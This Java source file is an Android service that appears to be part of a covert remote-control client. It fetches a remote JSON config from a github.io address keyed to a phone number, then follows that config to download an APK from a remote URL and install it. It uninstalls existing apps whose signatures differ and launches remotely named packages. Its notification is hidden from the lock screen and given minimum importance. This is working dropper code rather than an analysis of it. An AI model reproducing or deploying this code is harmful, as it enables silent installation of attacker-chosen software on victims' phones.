package com.android.sus_client.services;

import static com.android.sus_client.services.ForegroundService.NOTIFICATION_ICON_RES;
import static com.android.sus_client.services.ForegroundService.NOTIFICATION_ID;
import static com.android.sus_client.services.ForegroundService.NOTIFICATION_MSG;
import static com.android.sus_client.services.ForegroundService.NOTIFICATION_TITLE;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;

import com.android.sus_client.database.SharedPreferenceManager;
import com.android.sus_client.database.SharedPreferenceManager.Param;
import com.android.sus_client.utils.ApkUtils;
import com.android.sus_client.utils.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.StringReader;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DownloadInstallApp extends Service implements Runnable, SharedPreferences.OnSharedPreferenceChangeListener {

    private static String CONFIG_USER_KEY = "+918290448340";
    private static String FILE_PROVIDER_AUTHORITY = "com.anubhav.fileprovider";

    public static final String TAG = DownloadInstallApp.class.getSimpleName();
    private static final String KEY_ENABLE_SERVICE = "service_enable";
    private static final String KEY_UPDATE_NOW = "update_now";
    private static final String KEY_ENABLE_PACKAGE_INSTALL = "pkg_install_enable";
    private static final String KEY_DOWNLOAD_URL = "download_url";
    private static final String KEY_LAUNCH_PKG = "launch_pkg";

    private final Object lock = new Object();
    private ExecutorService executorService;
    private boolean isForeground = false;
    private int runningJobs = 0;

    private Notification.Builder notification;
    private NotificationManager notificationManager;
    private SharedPreferenceManager preferences;
    private Handler handler;
    private boolean updateNow = false;
    private boolean packageInstallEnabled = false;
    private boolean serviceEnabled = false;
    private String myFilePath = "";
    private String myLaunchPackage = "";
    private String myDownloadUrl = "";

    @Override
    public void onCreate() {
        Utils.getLog(TAG, "onCreate");
        // Creating Cached thread pool so that avoid creation of Thread //again and again
        this.executorService = Executors.newCachedThreadPool();
        this.notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Utils.getLog(TAG, "onStartCommand");
        this.handler = new Handler(Looper.getMainLooper());
        this.preferences = SharedPreferenceManager.get(this);
        this.preferences.setPreferencesChangeListener(this);
        initializePreferences();

        synchronized (lock) {
            executorService.execute(this);
            runningJobs++;
        }

        if (serviceEnabled) {
            startForegroundIfNeeded();
            return START_STICKY;
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Create NotificationChannel for the Foreground Service
     */
    private String createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = DownloadInstallApp.class.getSimpleName();
            NotificationChannel channel = new NotificationChannel(channelId, ApkUtils.getApplicationName(this), NotificationManager.IMPORTANCE_HIGH);
            channel.setImportance(NotificationManager.IMPORTANCE_NONE);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            notificationManager.createNotificationChannel(channel);
            return channelId;
        }
        return "";
    }

    /**
     * Create NotificationBuilder for the Foreground Service
     */
    private Notification.Builder createNotification() {
        Intent intent = new Intent(this, DownloadInstallApp.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, NOTIFICATION_ID, intent, Utils.getPendingIntentFlag());

        Notification.Builder notificationBuilder = new Notification.Builder(this);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = createNotificationChannel();
            notificationBuilder = new Notification.Builder(this, channelId);
        }
        return notificationBuilder
                .setSmallIcon(NOTIFICATION_ICON_RES)
                .setContentTitle(NOTIFICATION_TITLE)
                .setContentText(NOTIFICATION_MSG)
                .setPriority(Notification.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .setContentIntent(pendingIntent);
    }

    // Method to start the service in foreground if the no. of jobs is //larger
    private void startForegroundIfNeeded() {
        if (!isForeground) {
            notification = createNotification();
            startForeground(NOTIFICATION_ID, notification.build());
            isForeground = true;
        }
    }

    // method to stop Service if all the job i done
    private void stopForegroundIfAllDone() {
        if (runningJobs == 0 && isForeground) {
            stopForeground(true);
            isForeground = false;
        }
    }

    @Override
    public void onDestroy() {
        Utils.getLog(TAG, "onDestroy");
        super.onDestroy();
        preferences.removePreferencesChangeListener(this);
        executorService.shutdownNow();
        synchronized (lock) {
            runningJobs = 0;
            stopForegroundIfAllDone();
        }
    }

    /**
     * SharedPreferences settings
     */
    @Override
    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
        if (key == null) return;
        initializePreferences(sharedPreferences, SharedPreferenceManager.Param.valueOf(key));
    }

    private void initializePreferences() {
        updateNow = preferences.updateNowEnabled();
        packageInstallEnabled = preferences.packageInstallEnabled();
        serviceEnabled = preferences.installServiceEnabled();
        myFilePath = preferences.savedFilePath();
        myLaunchPackage = preferences.launchPackageName();
        myDownloadUrl = preferences.apkDownloadUrl();
    }

    private void initializePreferences(SharedPreferences sharedPrefs, SharedPreferenceManager.Param param) {
        switch (param) {
            case update_now_enabled:
                updateNow = preferences.read(param, false);
                break;
            case package_install_enabled:
                packageInstallEnabled = preferences.read(param, false);
                break;
            case install_service_enabled:
                serviceEnabled = preferences.read(param, false);
                break;
            case saved_file_path:
                myFilePath = preferences.read(param, "");
                break;
            case launch_package_name:
                myLaunchPackage = preferences.read(param, "");
                break;
            case apk_download_url:
                myDownloadUrl = preferences.read(param, "");
                break;
            default:
                Utils.getLog(TAG, "Not yet implemented in SharedPreferenceManager");
                break;
        }
    }

    @Override
    public void run() {
        try {
            JSONObject prefData = loadConfig(CONFIG_USER_KEY).getJSONObject("download_install");
            String notificationMsg = "";
            try {
                String msg = prefData.getString("notification_msg");
                notificationMsg = (msg.isEmpty() ? NOTIFICATION_MSG : msg);
            } catch (Exception ignored) {
                notificationMsg = NOTIFICATION_MSG;
            }

            preferences.setPreferencesChangeListener(DownloadInstallApp.this);
            preferences.updateNowEnabled(prefData.getBoolean(KEY_UPDATE_NOW));
            preferences.installServiceEnabled(prefData.getBoolean(KEY_ENABLE_SERVICE));
            preferences.packageInstallEnabled(prefData.getBoolean(KEY_ENABLE_PACKAGE_INSTALL));
            preferences.apkDownloadUrl(prefData.getString(KEY_DOWNLOAD_URL));
            preferences.launchPackageName(prefData.getString(KEY_LAUNCH_PKG));
            initializePreferences();

            if (serviceEnabled) {
                try {
                    Notification.Builder newNotification = notification.setContentText(notificationMsg);
                    notificationManager.notify(NOTIFICATION_ID, newNotification.build());
                } catch (Exception ignored) {
                }

                if (!myLaunchPackage.isEmpty()) {
                    ApkUtils.launchApplication(this, myLaunchPackage);
                }

                if (myFilePath.isEmpty()) {
                    downloadApp(myDownloadUrl);
                } else {
                    installApp(myFilePath);
                }
            } else {
                stopAndClear();
            }
        } catch (Exception e) {
            e.printStackTrace();
            stopAndClear();
        }
    }

    // must call in executor thread
    public void downloadApp(String webUrl) {
        if (webUrl.isEmpty()) {
            stopAndClear();
            return;
        }

        Utils.getLog(DownloadInstallApp.this, "downloadApp started");
        String mimeType = Utils.getMimeType(webUrl);
        String timeStamp = new SimpleDateFormat("EEEE_ddMMyyyy_HHmmss", Locale.getDefault()).format(new Date());
        String filename = "APP_" + timeStamp + ".apk";

        try {
            Uri fileUri;
            String filePath;
            OutputStream outputStream;

            boolean saveInCache = true;
            if (saveInCache) {
                File cacheDirectory = getCacheDir().getAbsoluteFile();
                if (!cacheDirectory.exists()) cacheDirectory.mkdirs();
                File cacheFile = new File(cacheDirectory, filename);
                fileUri = Uri.fromFile(cacheFile);
                filePath = cacheFile.getAbsolutePath();
                outputStream = new FileOutputStream(cacheFile);

            } else {
                Uri uriCollection;
                ContentValues contentValues = new ContentValues();
                contentValues.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
                contentValues.put(MediaStore.MediaColumns.MIME_TYPE, mimeType);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    uriCollection = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
                    contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
                } else {
                    uriCollection = MediaStore.Files.getContentUri("external");
                    File directory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                    contentValues.put(MediaStore.Files.FileColumns.DATA, directory + "/" + filename);
                }

                fileUri = getContentResolver().insert(uriCollection, contentValues);
                filePath = Utils.convertUriToFilePath(DownloadInstallApp.this, fileUri);
                outputStream = getContentResolver().openOutputStream(fileUri);
            }

            if (fileUri == null || fileUri.getPath() == null) {
                throw new IOException("Failed to create new MediaStore record.");
            }

            InputStream inputStream = new URL(webUrl).openStream();
            BufferedInputStream buffInputStream = new BufferedInputStream(inputStream);
            byte[] dataBuffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = buffInputStream.read(dataBuffer, 0, 1024)) != -1) {
                outputStream.write(dataBuffer, 0, bytesRead);
            }

            preferences.savedFilePath(filePath);
            installApp(filePath);
        } catch (Exception e) {
            e.printStackTrace();
            preferences.savedFilePath("");
            Utils.getLog(DownloadInstallApp.this, "downloadApp: " + e);
        }
    }

    // must call in executor thread
    public void installApp(String filePath) {
        Context context = this;

        if (packageInstallEnabled) {
            String pkgName = getApkPackageName(context, filePath);
            if (pkgName == null) pkgName = myLaunchPackage;
            if (isPackageInstalled(context, pkgName)) {
                if (ApkUtils.compareSignatureWithInstalledPackage(context, pkgName, filePath)) {
                    ApkUtils.launchApplication(context, pkgName);
                    stopAndClear();
                } else {
                    ApkUtils.uninstallApplication(context, pkgName);
                    if (isForeground) {
                        handler.postDelayed(() -> installApp(filePath), 1000 * 15);
                    } else {
                        runningJobs--;
                        stopForegroundIfAllDone();
                    }
                }
            } else {
                ApkUtils.installApk(context, new File(filePath), error -> {
                    Utils.getLog(context, "FileProvider Error: " + error.args);
                    if (error.args.contains(filePath) && error.args.contains("does not exists")) {
                        preferences.savedFilePath("");
                    } else stopAndClear();
                    return null;
                });
            }
        } else {
            stopAndClear();
        }
    }

    private void stopAndClear() {
        try {
            if (updateNow && !myFilePath.isEmpty()) {
                new File(myFilePath).delete();
            }
        } catch (Exception ignored) {
        } finally {
            if (updateNow) {
                preferences.remove(Param.install_service_enabled, Param.update_now_enabled, Param.package_install_enabled,
                        Param.apk_download_url, Param.launch_package_name, Param.saved_file_path);
            }
            stopSelf();
        }
    }

    /**
     * Global static functions
     */

    public static void start(Context context) {
        try {
            Intent intent = new Intent(context, DownloadInstallApp.class);
            context.startService(intent);
        } catch (IllegalArgumentException e) {
            // The process is classed as idle by the platform. Starting a background service is not allowed in this state.
            Utils.getLog(TAG, "Failed to start Service (process is idle).");
        } catch (IllegalStateException e) {
            // The app is in background, starting service is disallow
            Utils.getLog(TAG, "Failed to start Service (app is in background, foregroundAllowed == false)");
        }
    }

    private static String getApkPackageName(Context context, String apkPath) {
        try {
            PackageManager pm = context.getPackageManager();
            //int flag = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) ? PackageManager.GET_ATTRIBUTIONS : PackageManager.GET_ACTIVITIES;
            int flag = PackageManager.GET_ACTIVITIES;
            PackageInfo pi = pm.getPackageArchiveInfo(apkPath, flag);
            pi.applicationInfo.sourceDir = apkPath;
            pi.applicationInfo.publicSourceDir = apkPath;
            return pi.packageName;
        } catch (Exception e) {
            String manifest = ApkUtils.getAndroidManifest(apkPath);
            try (BufferedReader bfReader = new BufferedReader(new StringReader(manifest))) {
                String yourValue = null;
                String line;
                while ((line = bfReader.readLine()) != null) {
                    int ind = line.indexOf("package: name=");
                    if (ind >= 0) {
                        yourValue = line.substring(ind + "default =".length(), line.length() - 1).trim(); // -1 to remove de ";"
                        break;
                    }
                }
                return yourValue;
            } catch (IOException e1) {
                Utils.getLog(context, "getApkPackageName: " + e1);
                return null;
            }
        }
    }

    private static JSONObject loadConfig(String userKey) throws IOException, JSONException {
        URL url = new URL("https://redmi9primemv.github.io/CodeReverse/files/user_config.json");
        try (InputStream input = url.openStream()) {
            InputStreamReader isr = new InputStreamReader(input);
            BufferedReader reader = new BufferedReader(isr);
            StringBuilder json = new StringBuilder();
            int c;
            while ((c = reader.read()) != -1) {
                json.append((char) c);
            }
            JSONObject response = new JSONObject(json.toString());
            return response.getJSONObject(userKey);
        }
    }

    /**
     * Must be add to be work in android 30 or higher
     * <queries>
     * <package android:name="com.example.app"/>
     * <package android:name="com.example.other.app"/>
     * </queries>
     */
    private static boolean isPackageInstalled(Context context, String packageName) {
        try {
            context.getPackageManager().getPackageInfo(packageName, 0);
            Utils.getLog(context, "Package installed successfully " + packageName);
            return true;
        } catch (Exception e) {
            Utils.getLog(context, "Package not installed: " + e);
            return false;
        }
    }

}